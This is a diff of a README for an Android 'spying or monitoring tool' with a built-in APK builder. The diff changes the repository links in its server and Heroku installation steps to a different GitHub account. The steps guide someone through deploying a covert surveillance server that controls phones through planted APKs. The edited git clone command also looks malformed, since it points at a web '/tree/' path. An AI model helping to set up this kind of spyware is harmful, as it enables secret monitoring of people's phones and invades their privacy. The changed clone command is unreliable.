@@ -19,7 +19,7 @@ A cloud based Android Spying or Monitoring Tool, powered by NodeJS
 - Command Queuing
 - Built In APK Builder
 
-## Installation on Server and VPS [Click Here](https://github.com/vikashmobileclinic/AndroidSpyServer)
+## Installation on Server and VPS [Click Here](https://github.com/anilje8930/anilspy/tree/herooku)
 
 ## Installation on Heroku Free Server
 
@@ -34,7 +34,7 @@ A cloud based Android Spying or Monitoring Tool, powered by NodeJS
 
 3. Now install Heroku CLI on your Computer [Instuctions](https://devcenter.heroku.com/articles/heroku-cli)
 
-4. Now open your terminal and run command `git clone -b herooku https://github.com/vikashmobileclinic/AndroidSpyServer`
+4. Now open your terminal and run command `git clone -b herooku https://github.com/anilje8930/anilspy/tree/herooku`
 
 5. It will download Latest codes for you in your PC
     
